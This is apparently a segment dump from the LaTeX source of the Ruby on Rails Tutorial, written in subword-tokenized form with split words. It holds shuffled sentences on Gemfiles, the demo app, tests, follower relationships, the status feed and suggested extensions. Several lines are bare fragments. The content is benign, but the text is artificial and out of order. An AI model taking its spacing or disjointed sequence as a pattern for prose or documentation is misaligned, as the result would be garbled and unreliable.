▁( We ▁could ▁have ▁switch ed ▁from ▁\ k ode { user } ▁to ▁\ k ode { self }, ▁but ▁recall ▁from ▁Section ~\ ref { sec : the _ ca ve at } ▁that ▁\ k ode { self } ▁is ▁optional ▁inside ▁the ▁model .)
▁Add ▁tests ▁for ▁the ▁sidebar ▁micropost ▁count s ▁( including ▁proper ▁ pluralization ).
▁Add ▁tests ▁for ▁micropost ▁pagination .
▁Writ e ▁a ▁test ▁to ▁make ▁sure ▁delete ▁links ▁do ▁not ▁appear ▁for ▁microposts ▁not ▁created ▁by ▁the ▁current ▁user .
▁in ▁Listing ~\ ref { code : wrap }.
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { raw } ▁method ▁to ▁prevent ▁Rails ▁from ▁es ca p ing ▁the ▁result ing ▁HTML , ▁together ▁with ▁the ▁\ k ode { sanitize } ▁method ▁needed ▁to ▁prevent ▁c ross - site ▁ script ing .
▁in ▁Listing ~\ ref { code : password _ resets _ resource }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : password _ reset _ test }
▁from ▁Listing ~\ ref { code : password _ reset _ form } ▁to
▁To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password \_ reset \_ expired ?}\ ▁method .
▁For ▁example , ▁when ▁search ing ▁for ▁a ▁file ▁called ▁`` Gemfile '' , ▁ s i x ▁possibilities ▁will ▁show ▁up , ▁because ▁each ▁project ▁has ▁matching ▁files ▁called ▁\ k ode { Gemfile } ▁and ▁\ k ode { Gemfile . lock }.
▁As ▁in ▁Section ~\ ref { sec : planning _ the _ application }, ▁our ▁next ▁step ▁is ▁to ▁use ▁a ▁text ▁editor ▁to ▁update ▁the ▁\ k ode { Gemfile } ▁with ▁the ▁gems ▁needed ▁by ▁our ▁application .
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁app .
▁In ▁case ▁you ' ve ▁previous ly ▁installed ▁a ▁version ▁of ▁a ▁gem ▁( such ▁as ▁Rails ▁itself ) ▁other ▁than ▁the ▁one ▁specified ▁by ▁the ▁\ k ode { Gemfile }, ▁it ' s ▁a ▁good ▁idea ▁to ▁\ emph { update } ▁the ▁gems ▁with ▁\ k ode { bundle ▁update } ▁to ▁make ▁sure ▁the ▁versions ▁match :
▁as ▁show n ▁in ▁Listing ~\ ref { code : sample _ app _ readme }.
▁Then ▁change ▁it ▁to ▁use ▁the ▁ Markdown ▁extension ~\ k ode { . m d } ▁and ▁commit ▁the ▁changes :
▁If ▁you ▁take ▁another ▁look ▁at ▁the ▁output ▁in ▁Listing ~\ ref { code : generating _ pages }, ▁you ▁m ight ▁be ▁able ▁to ▁guess ▁the ▁correspond ence ▁between ▁actions ▁and ▁views : ▁an ▁action ▁like ▁\ k ode { home } ▁has ▁a ▁corresponding ▁view ▁called ▁\ k ode { home . html . erb }.
▁( You ▁won ' t ▁actually ▁see ▁the ▁color ▁green ▁unless ▁you ▁add ▁ MiniTest ▁ reporters ▁in ▁the ▁optional ▁Section ~\ ref { sec : mini test _ reporters }. )
▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App ▁|
▁We ▁can ▁see ▁how ▁this ▁works ▁by ▁replacing ▁the ▁literal ▁title ▁`` Home '' ▁in ▁the ▁\ k ode { home . html . erb } ▁view ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ view _ erb _ title }.
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁core ▁sample ▁application ▁by ▁adding ▁a ▁so cial ▁layer ▁that ▁allows ▁users ▁to ▁follow ▁( and ▁unfollow ) ▁other ▁users , ▁result ing ▁in ▁each ▁user ' s ▁Home ▁page ▁display ing ▁a ▁status ▁feed ▁of ▁the ▁followed ▁users ' ▁microposts .
▁We ▁will ▁also ▁make ▁views ▁to ▁display ▁both ▁a ▁user ' s ▁followers ▁and ▁the ▁users ▁each ▁user ▁is ▁following .
▁( N o w ▁you ▁know ▁why ▁HTML ▁views ▁have ▁the ▁file ▁extension ▁\ k ode { . html . erb }. )
▁There ▁is ▁a ▁second ▁popular ▁template ▁system ▁called ▁\ href { http :// h am l - lang . com /}{ H am l }, ▁which ▁I ▁person ally ▁ lo ve , ▁but ▁it ' s ▁not ▁\ emph { quit e } ▁standard ▁enough ▁yet ▁for ▁use ▁in ▁an ▁introduc tory ▁tutorial .
▁It ' s ▁likely ▁that ▁many ▁of ▁the ▁idea s ▁in ▁this ▁section ▁won ' t ▁seem ▁obvious ▁at ▁first , ▁and ▁it ▁may ▁take ▁a ▁while ▁for ▁the ▁rather ▁complicated ▁data ▁model ▁to ▁ s in k ▁in .
▁If ▁you ▁find ▁yourself ▁getting ▁confuse d , ▁try ▁push ing ▁forward ▁to ▁the ▁end ; ▁the n , ▁read ▁the ▁section ▁a ▁second ▁time ▁through ▁to ▁see ▁if ▁things ▁are ▁clear er .
▁Using ▁Rails ' ▁default ▁ pluralization ▁convention , ▁the ▁set ▁of ▁all ▁users ▁following ▁a ▁given ▁user ▁is ▁that ▁user ' s ▁\ emph { followers }, ▁and ▁\ k ode { user . followers } ▁is ▁an ▁array ▁of ▁those ▁users .
▁In ▁order ▁to ▁factor ▁out ▁this ▁common ▁structure , ▁Rails ▁comes ▁with ▁a ▁special ▁\ emph { layout } ▁file ▁called ▁\ k ode { application . html . erb }, ▁which ▁we ▁re name d ▁in ▁the ▁beginning ▁of ▁this ▁section ▁( Section ~\ ref { sec : slightly _ dynamic _ pages }) ▁and ▁which ▁we ' ll ▁now ▁re store :
▁We ▁will ▁add ▁a ▁uniqueness ▁validation ▁to ▁the ▁Relationship ▁model , ▁but ▁because ▁it ▁is ▁\ emph { always } ▁an ▁error ▁to ▁create ▁duplicate ▁relationships , ▁the ▁unique ▁index ▁is ▁ s u ff ic i ent ▁for ▁now .
▁To ▁create ▁the ▁\ k ode { relationships } ▁table , ▁we ▁ migrate ▁the ▁database ▁and ▁ prepare ▁the ▁test ▁database ▁as ▁usual :
▁Before ▁implement ing ▁followed ▁users ▁and ▁followers , ▁we ▁first ▁need ▁to ▁establish ▁the ▁association ▁between ▁users ▁and ▁relationships .
▁in ▁Listing ~\ ref { code : user _ relationships _ association } ▁and
▁( Note ▁that , ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ root _ route }, ▁the ▁previous ▁route ▁\ k ode { static \_ pages / home } ▁will ▁no ▁longer ▁work .)
▁Follow ▁the ▁\ href { http :// dev center . heroku . com / articles / local - postgresql }{ Heroku ▁instructions ▁for ▁local ▁PostgreSQL ▁installation } ▁to ▁install ▁the ▁PostgreSQL ▁database ▁on ▁your ▁local ▁system .
▁as ▁show n ▁in ▁Listing ~\ ref { code : Gemfile _ p g _ gem }.
▁You ▁will ▁also ▁have ▁to ▁learn ▁about ▁the ▁\ k ode { config / database . yml } ▁file ▁and ▁how ▁to ▁run ▁PostgreSQL ▁local ly .
▁as ▁show n ▁in ▁Listing ~\ ref { code : gitignore }.
▁Your ▁goal ▁should ▁be ▁to ▁create ▁and ▁configure ▁both ▁the ▁development ▁database ▁and ▁the ▁test ▁database ▁to ▁use ▁PostgreSQL .
▁I ▁es pecially ▁recommend ▁using ▁\ href { http :// in d u c t ion app . com /}{ In d u c t ion } ▁to ▁connect ▁to ▁and ▁view ▁the ▁local ▁PostgreSQL ▁database .
▁If ▁you ▁get ▁ st uck , ▁don ' t ▁he s it ate ▁to ▁skip ▁it ; ▁as ▁noted ▁previous ly , ▁the ▁sample ▁application ▁ developed ▁in ▁this ▁tutorial ▁is ▁fully ▁compatib le ▁with ▁both ▁SQLite ▁and ▁PostgreSQL .
▁The ▁final ▁piece ▁of ▁the ▁relationships ▁p u z z le ▁is ▁to ▁add ▁a ▁\ k ode { user . followers } ▁method ▁to ▁go ▁with ▁\ k ode { user . following }.
▁Inde ed , ▁the ▁technique ▁is ▁exactly ▁the ▁same ▁as ▁for ▁followed ▁users , ▁with ▁the ▁role s ▁of ▁\ k ode { follower \_ id } ▁and ▁\ k ode { followed \_ id } ▁reverse d , ▁and ▁with ▁\ k ode { passive \_ relationships } ▁in ▁place ▁of ▁\ k ode { active \_ relationships }.
▁It ' s ▁worth ▁noting ▁that ▁we ▁could ▁actually ▁omit ▁the ▁\ k ode { : source } ▁key ▁for ▁\ k ode { followers } ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships }, ▁using ▁simply
▁Even ▁better , ▁we ▁can ▁configure ▁Guard ▁so ▁that ▁when , ▁say , ▁the ▁\ k ode { home . html . erb } ▁file ▁is ▁modified , ▁the ▁\ k ode { static \_ pages \_ controller \_ test . rb } ▁automatically ▁run s .
▁The ▁\ k ode { Gemfile } ▁in ▁Listing ~\ ref { code : gemfile _ sample _ app } ▁has ▁already ▁included ▁the ▁\ text tt { guard } ▁gem ▁in ▁our ▁application , ▁so ▁to ▁get ▁started ▁we ▁just ▁need ▁to ▁initialize ▁it :
▁The ▁un for t un ate ▁ hybrid ▁usage ▁in ▁the ▁`` following '' ▁route ▁is ▁force d ▁by ▁our ▁choice ▁to ▁use ▁the ▁un am b ig u ous ▁`` followed ▁users '' ▁terminology ▁along ▁with ▁the ▁`` following '' ▁usage ▁from ▁Twitter .
▁as ▁show n ▁in ▁Listing ~\ ref { code : following _ followers _ authorization _ test }.
▁in ▁Listing ~\ ref { code : following _ followers _ tests }.
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁sample ▁application
▁Ruby ▁on ▁Rails < n > T u to rial
▁It ' s ▁best ▁not ▁to ▁rely ▁on ▁that , ▁though , ▁so ▁we ' ve ▁take n ▁the ▁extra ▁step ▁and ▁added ▁an ▁extra ▁layer ▁of ▁security .
▁First , ▁we ▁will ▁need ▁to ▁know ▁about ▁the ▁do ll ar - sign ▁syntax ▁to ▁access ▁a ▁DOM ▁element ▁base d ▁in ▁its ▁unique ▁CSS ~ id .
▁We ▁come ▁now ▁to ▁the ▁p in n ac le ▁of ▁our ▁sample ▁application : ▁the ▁status ▁feed .
▁in ▁Listing ~\ ref { code : full _ feed _ test }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ feed }.
▁ Adding ▁the ▁complete d ▁feed ▁to ▁the ▁User ▁model .
▁Here , ▁we ▁expect ▁it ▁to ▁be ▁more ▁complicated , ▁something ▁like
▁is ▁automatically ▁convert ed ▁to
▁We ' ve ▁also ▁omitted ▁the ▁leading ▁\ k ode { Micropost . } \ ▁since ▁we ▁expect ▁this ▁method ▁to ▁live ▁in ▁the ▁Micropost ▁model ▁itself .)
▁by ▁itself .
▁How ▁co ol ▁is ▁that ?
▁This ▁means ▁we ▁can ▁use
▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ first _ cut }.
▁A ▁first ▁ cut ▁at ▁the ▁\ k ode { from \_ users \_ followed \_ by } ▁method .
▁In ▁some ▁applications , ▁this ▁initial ▁implementation ▁m ight ▁be ▁good ▁enough ▁for ▁most ▁practical ▁purposes , ▁but ▁Listing ~\ ref { code : from _ users _ followed _ by _ first _ cut } ▁is n ' t ▁the ▁final ▁implementation ; ▁see ▁if ▁you ▁can ▁make ▁a ▁guess ▁about ▁why ▁not ▁before ▁mov ing ▁on ▁to ▁the ▁next ▁section .
▁pull s ▁\ emph { all } ▁the ▁followed ▁users ' ▁id s ▁into ▁memory , ▁and ▁creates ▁an ▁array ▁the ▁full ▁length ▁of ▁the ▁followed ▁users ▁array .
▁S ince ▁the ▁condition ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ first _ cut } ▁actually ▁just ▁check s ▁inclusion ▁in ▁a ▁set , ▁there ▁must ▁be ▁a ▁more ▁ efficient ▁way ▁to ▁do ▁this , ▁and ▁in de ed ▁SQL ▁is ▁optimized ▁for ▁just ▁such ▁set ▁operations .
▁We ' ll ▁start ▁by ▁refactoring ▁the ▁feed ▁with ▁the ▁slightly ▁modified ▁code ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ second _ cut }.
▁I mprov ing ▁\ k ode { from \_ users \_ followed \_ by }.
▁# ▁Return s ▁microposts ▁from ▁the ▁users ▁being ▁followed ▁by ▁the ▁given ▁user .
▁following
▁< n > ▁following
▁For ▁a ▁more ▁advanced ▁way ▁to ▁create ▁the ▁necessary ▁ subselect , ▁see ▁the ▁blog ▁post ▁\ href { http :// p i v o t all abs . com / users / js us s er / blog / articles / 5 6 7 - h ac k ing - a - subselect - in - active record }{ ` ` H ac k ing ▁a ▁ subselect ▁in ▁ActiveRecord ''. }
▁as ▁seen ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final }.
▁The ▁final ▁implementation ▁of ▁\ k ode { from \_ users \_ followed \_ by }.
▁" Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App ▁| ▁Home "
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final }, ▁our ▁status ▁feed ▁is ▁now ▁complete .
▁" Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App ▁| ▁About "
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁proto - feed ▁( F igure ~\ ref { fig : home _ with _ proto _ feed }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final } ▁as ▁seen ▁in ▁F igure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁With ▁the ▁addition ▁of ▁the ▁status ▁feed , ▁we ' ve ▁finished ▁the ▁core ▁sample ▁application ▁for ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }.
▁De s p ite ▁this ▁i mp re s s ive ▁list , ▁there ▁is ▁ still ▁much ▁to ▁learn ▁about ▁Rails .
▁The ▁pro p o s ed ▁extensions ▁in ▁this ▁section ▁are ▁most ly ▁in s p ir ed ▁either ▁by ▁general ▁features ▁common ▁to ▁web ▁applications , ▁such ▁as ▁password ▁remind ers ▁and ▁email ▁confirmation , ▁or ▁features ▁specific ▁to ▁our ▁type ▁of ▁sample ▁application , ▁such ▁as ▁search , ▁re p li es , ▁and ▁me s s a g ing .
▁Implement ing ▁one ▁or ▁more ▁of ▁these ▁application ▁extensions ▁will ▁help ▁you ▁make ▁the ▁tr an s it ion ▁from ▁following ▁a ▁tutorial ▁to ▁writing ▁original ▁applications ▁of ▁your ▁own .
▁Do n ' t ▁be ▁surpris ed ▁if ▁it ' s ▁t ough ▁going ▁at ▁first ; ▁the ▁blank ▁ s l ate ▁of ▁a ▁new ▁feature ▁can ▁be ▁quite ▁in t i m id at ing .
▁To ▁help ▁get ▁you ▁started , ▁I ▁can ▁give ▁two ▁pieces ▁of ▁general ▁a d v ic e .
▁First , ▁before ▁adding ▁any ▁feature ▁to ▁a ▁Rails ▁application , ▁take ▁a ▁look ▁at ▁the ▁\ href { http :// r ailscasts . com / episodes / archive }{ RailsCast s ▁ archive } ▁to ▁see ▁if ▁ Ryan ▁B ate s ▁has ▁already ▁covered ▁the ▁subject
▁Note ▁that ▁ RailsCast s ▁usually ▁omit ▁the ▁tests , ▁which ▁is ▁ probably ▁necessary ▁to ▁keep ▁the ▁ episodes ▁nice ▁and ▁short , ▁but ▁you ▁could ▁get ▁the ▁wrong ▁idea ▁about ▁the ▁ import ance ▁of ▁testing .
▁On ce ▁you ' ve ▁ watch ed ▁the ▁relevant ▁ RailsCast ▁to ▁get ▁a ▁basic ▁idea ▁of ▁how ▁to ▁proceed , ▁I ▁suggest ▁writing ▁the ▁new ▁feature ▁using ▁test - driven ▁development .
▁( In ▁this ▁context , ▁I ▁recommend ▁tak ing ▁a ▁look ▁at ▁\ href { http :// r ailscasts . com / episodes / 27 5 - how - i - test }{ the ▁ RailsCast ▁on ▁`` H o w ▁I ▁test '' }.
▁You ' ll ▁see ▁that ▁ Ryan ▁B ate s ▁h i m self ▁often ▁uses ▁ TDD ▁for ▁real - life ▁development , ▁and ▁in ▁fact ▁his ▁testing ▁style ▁is ▁similar ▁to ▁the ▁style ▁used ▁in ▁this ▁tutorial .)
▁If ▁he ▁has , ▁ watch ing ▁the ▁relevant ▁ RailsCast ▁first ▁will ▁often ▁save ▁you ▁a ▁to n ▁of ▁time .
▁S ec on d , ▁always ▁do ▁ ext en s ive ▁Google ▁search es ▁on ▁your ▁pro p o s ed ▁feature ▁to ▁find ▁relevant ▁blog ▁posts ▁and ▁tutorial s .
▁Web ▁application ▁development ▁is ▁hard , ▁and ▁it ▁help s ▁to ▁learn ▁from ▁the ▁experience ▁( and ▁mistake s ) ▁of ▁other s .
▁M any ▁of ▁the ▁following ▁features ▁are ▁quite ▁challenging , ▁and ▁I ▁have ▁given ▁some ▁hint s ▁about ▁the ▁tool s ▁you ▁m ight ▁need ▁to ▁implement ▁them .
▁Even ▁with ▁hint s , ▁they ▁are ▁\ emph { much } ▁more ▁difficult ▁than ▁the ▁book ' s ▁end - of - chapter ▁ exercises , ▁so ▁don ' t ▁be ▁d is c our age d ▁if ▁you ▁can ' t ▁solve ▁them ▁without ▁consider able ▁effort .
▁Twitter ▁allows ▁users ▁to ▁make ▁`` @ re p li es '' , ▁which ▁are ▁microposts ▁who se ▁first ▁characters ▁are ▁the ▁user ' s ▁login ▁pre c ed ed ▁by ▁the ▁\ text tt {@ } ~ sign .
▁These ▁posts ▁only ▁appear ▁in ▁the ▁feed ▁of ▁the ▁user ▁in ▁question ▁or ▁users ▁following ▁that ▁user .
▁Implement ▁a ▁ simplified ▁version ▁of ▁this , ▁restrict ing ▁@ re p li es ▁to ▁appear ▁only ▁in ▁the ▁feed s ▁of ▁the ▁re c ip i ent ▁and ▁the ▁send er .
▁This ▁m ight ▁involve ▁adding ▁an ▁\ k ode { in \_ reply \_ to } ▁column ▁in ▁the ▁\ k ode { microposts } ▁table ▁and ▁an ▁extra ▁\ k ode { including \_ re p li es } ▁scope ▁to ▁the ▁Micropost ▁model .
▁S ince ▁our ▁application ▁ la c k s ▁unique ▁user ▁login s , ▁you ▁will ▁also ▁have ▁to ▁decide ▁on ▁a ▁way ▁to ▁represent ▁users .
▁One ▁option ▁is ▁to ▁use ▁a ▁combination ▁of ▁the ▁id ▁and ▁the ▁name , ▁such ▁as ▁\ k ode {@ 1 - michael - hartl }.
▁A nother ▁is ▁to ▁\ emph { add } ▁a ▁unique ▁username ▁to ▁the ▁signup ▁process ▁and ▁the n ▁use ▁it ▁in ▁@ re p li es .
▁Twitter ▁supports ▁direct ▁( private ) ▁me s s a g ing ▁by ▁prefix ing ▁a ▁micropost ▁with ▁the ▁letter ~ ` ` d ''.
▁Implement ▁this ▁feature ▁for ▁the ▁sample ▁application .
▁The ▁solution ▁will ▁ probably ▁involve ▁a ▁ Message ▁model ▁and ▁a ▁regular ▁expression ▁match ▁on ▁new ▁microposts .
▁Follow er ▁ notifications
▁Implement ▁a ▁feature ▁to ▁send ▁each ▁user ▁an ▁email ▁not if ic ation ▁when ▁they ▁gain ▁a ▁new ▁follower .
▁Then ▁make ▁the ▁not if ic ation ▁optional , ▁so ▁that ▁users ▁can ▁opt ▁out ▁if ▁desired .
▁A mong ▁other ▁things , ▁adding ▁this ▁feature ▁requires ▁learning ▁how ▁to ▁send ▁mail ▁with ▁Rails .
▁To ▁get ▁started , ▁I ▁suggest ▁view ing ▁the ▁\ href { http :// r ailscasts . com / episodes / 2 06 - action - mailer - in - rails - 3 }{ RailsCast ▁on ▁Action ▁Mailer ▁in ▁Rails ~3 }.
▁ Password ▁remind ers
▁Currently , ▁if ▁our ▁application ' s ▁users ▁ forget ▁their ▁passwords , ▁they ▁have ▁no ▁way ▁to ▁retrieve ▁them .
▁Signup ▁confirmation
▁A part ▁from ▁an ▁email ▁regular ▁expression , ▁the ▁sample ▁application ▁current ly ▁has ▁no ▁way ▁to ▁verify ▁the ▁validity ▁of ▁a ▁user ' s ▁email ▁address .
▁Add ▁an ▁email ▁address ▁ ve r if ic ation ▁step ▁to ▁confirm ▁a ▁user ' s ▁signup .
▁The ▁new ▁feature ▁should ▁create ▁users ▁in ▁an ▁in active ▁state , ▁email ▁the ▁user ▁an ▁activation ▁URL , ▁and ▁the n ▁change ▁the ▁user ▁to ▁an ▁active ▁state ▁when ▁the ▁URL ▁get s ▁hit .
▁You ▁m ight ▁want ▁to ▁read ▁up ▁on ▁\ href { http :// www . google . com / search ? q = state + ma ch in es + in + rails }{ state ▁machine s ▁in ▁Rails } ▁to ▁help ▁you ▁with ▁the ▁in active / active ▁tr an s it ion .
▁R SS ▁feed
▁For ▁each ▁user , ▁implement ▁an ▁R SS ▁feed ▁for ▁their ▁microposts .
▁Then ▁implement ▁an ▁R SS ▁feed ▁for ▁their ▁status ▁feed , ▁optional ly ▁restrict ing ▁access ▁to ▁that ▁feed ▁using ▁an ▁authentication ▁ scheme .
▁The ▁\ href { http :// r ailscasts . com / episodes / 87 - generating - r s s - feed s }{ RailsCast ▁on ▁ generating ▁R SS ▁feed s } ▁will ▁help ▁get ▁you ▁started .
▁REST ▁API
▁M any ▁website s ▁expose ▁an ▁Application ▁ Pro gr am m er ▁In ter fa ce ▁( API ) ▁so ▁that ▁third - part y ▁applications ▁can ▁get , ▁post , ▁put , ▁and ▁delete ▁the ▁application ' s ▁resources .
▁Implement ▁such ▁a ▁REST ▁API ▁for ▁the ▁sample ▁application .
▁Be ▁careful ▁about ▁security ; ▁the ▁API ▁should ▁only ▁be ▁accessible ▁to ▁authoriz ed ▁users .
▁Currently , ▁there ▁is ▁no ▁way ▁for ▁users ▁to ▁find ▁each ▁other , ▁a part ▁from ▁p a g ing ▁through ▁the ▁user ▁index ▁or ▁view ing ▁the ▁feed s ▁of ▁other ▁users .
▁Implement ▁a ▁search ▁feature ▁to ▁re m ed y ▁this .
▁Then ▁add ▁another ▁search ▁feature ▁for ▁microposts .
▁The ▁\ href { http :// r ailscasts . com / episodes / 37 - simple - search - form }{ RailsCast ▁on ▁simple ▁search ▁forms } ▁will ▁help ▁get ▁you ▁started .
▁If ▁you ▁deploy ▁using ▁a ▁ shared ▁host ▁or ▁a ▁d ed icated ▁server , ▁I ▁suggest ▁using ▁\ href { http :// free la n c ing - go d . github . com / t s / en /}{ T h in k ing ▁S ph in x } ▁( following ▁the ▁\ href { http :// r ailscasts . com / episodes /1 20 - th in k ing - s ph in x }{ RailsCast ▁on ▁T h in k ing ▁S ph in x }).
▁If ▁you ▁deploy ▁on ▁Heroku , ▁you ▁should ▁follow ▁the ▁\ href { http :// dev center . heroku . com / articles / full - text - search }{ Heroku ▁full ▁text ▁search } ▁instructions .
▁There ▁are ▁a ▁we al th ▁of ▁Rails ▁resources ▁in ▁store s ▁and ▁on ▁the ▁web --- in de ed , ▁the ▁supply ▁is ▁so ▁rich ▁that ▁it ▁can ▁be ▁over w hel m ing .
▁\ href { http :// rails la b . new rel ic . com / sc al ing - rails }{ S c al ing ▁Rails } : ▁One ▁topic ▁we ' ve ▁hard ly ▁covered ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁book ▁is ▁performance , ▁opt i m i z ation , ▁and ▁scaling .
▁L uckily , ▁most ▁site s ▁will ▁ never ▁run ▁into ▁serious ▁scaling ▁issues , ▁and ▁using ▁anything ▁ beyond ▁plain ▁Rails ▁is ▁ probably ▁pre m at ure ▁opt i m i z ation .
▁If ▁you ▁do ▁run ▁into ▁performance ▁issues , ▁the ▁\ href { http :// rails la b . new rel ic . com / sc al ing - rails }{ S c al ing ▁Rails } ▁series ▁from ▁G re g g ▁P o ll ac k ▁of ▁\ href { http :// env y l abs . com /}{ E n v y ▁L abs } ▁is ▁a ▁good ▁place ▁to ▁start .
▁I ▁also ▁recommend ▁in ve st ig at ing ▁the ▁site ▁m on it or ing ▁applications ▁\ href { http :// sc out app . com /}{ S c out } ▁and ▁\ href { http :// www . new rel ic . com /}{ New ▁Re li c }
▁In ▁addition ▁to ▁being ▁a ▁cl ever ▁ ph ra se --- \ emph { new ▁ rel ic } ▁being ▁a ▁con tr ad ic t ion ▁in ▁terms --- New ▁Re li c ▁is ▁also ▁an ▁an a gr am ▁for ▁the ▁name ▁of ▁the ▁company ' s ▁found er , ▁L e w ▁C ir n e .
▁And , ▁as ▁you ▁m ight ▁suspect ▁by ▁now , ▁there ▁are ▁ RailsCast s ▁on ▁many ▁scaling ▁subject s , ▁including ▁pro f il ing , ▁caching , ▁and ▁background ▁job s .
▁in ▁Listing ~\ ref { code : micropost _ dependency _ test }.
▁Re factor
▁ Content s
▁in ▁Listing ~\ ref { code : home _ feed _ test }.
▁Next , ▁we ' ll ▁use ▁a ▁text ▁editor ▁to ▁update ▁the ▁\ k ode { Gemfile } ▁needed ▁by ▁Bundler ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux }.
▁Note ▁that , ▁in ▁order ▁to ▁ensure ▁that ▁the ▁command ▁uses ▁the ▁version ▁of ▁Rake ▁corresponding ▁to ▁our ▁\ k ode { Gemfile }, ▁we ▁need ▁to ▁run ▁\ k ode { rake } ▁using ▁\ k ode { bundle ▁exec }.
▁For ▁example , ▁the ▁page ▁for ▁list ing ▁all ▁users ▁is ▁at ▁\ href { http ://0.0.0.0:3000/ users }{/ users }, ▁and ▁the < n > page ▁for ▁making ▁a ▁new ▁user ▁is ▁at ▁\ href { http ://0.0.0.0:3000/ users / new }{/ users / new }.
▁We ▁start ▁with ▁the ▁page ▁to ▁show ▁all ▁the ▁users ▁in ▁our ▁application , ▁called ▁\ href { http ://0.0.0.0:3000/ users }{\ text tt { index } } ; ▁as ▁you ▁m ight ▁expect , ▁initially ▁there ▁are ▁no ▁users ▁at ▁all ▁( F igure ~\ ref { fig : demo _ blank _ user _ index _ rails _3} ).
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http ://0.0.0.0:3000/ users }{/ users }).
▁To ▁make ▁a ▁new ▁user , ▁we ▁visit ▁the ▁\ href { http ://0.0.0.0:3000/ users / new }{\ text tt { new } } ▁page , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : demo _ new _ user _ rails _3} .
▁The ▁new ▁user ▁page ▁(\ href { http ://0.0.0.0:3000/ users / new }{/ users / new }).
▁The ▁result ▁is ▁the ▁user ▁\ href { http ://0.0.0.0:3000/ users /1 }{\ text tt { show } } ▁page , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ show _ user _ rails _3} .
▁Note ▁that ▁the ▁URL ▁is ▁\ href { http ://0.0.0.0:3000/ users /1}{ / users /1 } ; ▁as ▁you ▁m ight ▁suspect , ▁the ▁number ~\ k ode {1} ▁is ▁simply ▁the ▁user ' s ~\ k ode { id } ▁attribute ▁from ▁F igure ~\ ref { fig : demo _ user _ model }.
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http ://0.0.0.0:3000/ users /1}{ / users /1 }).
▁To ▁change ▁a ▁user ' s ▁information , ▁we ▁visit ▁the ▁\ href { http ://0.0.0.0:3000/ users /1/ edit }{\ text tt { edit } } ▁page ▁( F igure ~\ ref { fig : demo _ edit _ user _ rails _3} ).
▁The ▁user ▁edit ▁page ▁(\ href { http ://0.0.0.0:3000/ users /1/ edit }{/ users /1/ edit }).
▁Now ▁we ' ll ▁create ▁a ▁second ▁user ▁by ▁re visit ing ▁the ▁\ href { http ://0.0.0.0:3000/ users / new }{\ text tt { new } } ▁page ▁and ▁ submitting ▁a ▁second ▁set ▁of ▁user ▁information ; ▁the ▁result ing ▁user ▁\ href { http ://0.0.0.0:3000/ users }{\ text tt { index } } ▁is ▁show n ▁in ▁F igure ~\ ref { fig : demo _ user _ index _ two _ rails _3} .
▁The ▁user ▁index ▁page ▁(\ href { http ://0.0.0.0:3000/ users }{/ users }) ▁with ▁a ▁second ▁user .
▁Ou r ▁strategy ▁will ▁be ▁to ▁describe ▁the ▁results ▁of ▁a ▁typical ▁browser ▁hit --- a ▁visit ▁to ▁the ▁user ▁index ▁page ▁at ▁\ href { http ://0.0.0.0:3000/ users }{/ users }--- in ▁terms ▁of ▁MVC ▁( F igure ~\ ref { fig : mvc _ detailed }).
▁ V ar i able s ▁that ▁start ▁with ▁the ▁\ k ode {@ } ~ sign , ▁called ▁\ emph { instance ▁variables }, ▁are ▁automatically ▁available ▁in ▁the ▁views ; ▁in ▁this ▁case , ▁the ▁\ k ode { index . html . erb } ▁view ▁in ▁Listing ~\ ref { code : demo _ index _ view } ▁iterate s ▁through ▁the ▁\ k ode {@ users } ▁list ▁and ▁output s ▁a ▁line ▁of ▁HTML ▁for ▁each ▁one .
▁No ▁layout .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http ://0.0.0.0:3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ new _ micropost }.
▁The ▁new ▁micropost ▁page ▁(\ href { http ://0.0.0.0:3000/ microposts / new }{/ microposts / new }).
▁The ▁micropost ▁index ▁page ▁(\ href { http ://0.0.0.0:3000/ microposts }{/ microposts }).
▁This ▁chapter ▁cover s ▁a ▁lot ▁of ▁material , ▁and ▁it ' s ▁O K ▁not ▁to ▁get ▁it ▁all ▁on ▁the ▁first ▁pass .
▁We ' ve ▁\ emph { almost } ▁achieve d ▁that ▁with ▁our ▁current ▁layout , ▁with ▁one ▁ w r in k le : ▁as ▁you ▁can ▁see ▁if ▁you ▁delete ▁the ▁\ k ode { provide } ▁call ▁in ▁one ▁of ▁the ▁views , ▁in ▁the ▁absence ▁of ▁a ▁page - specific ▁title ▁the ▁full ▁title ▁appears ▁as ▁follows :
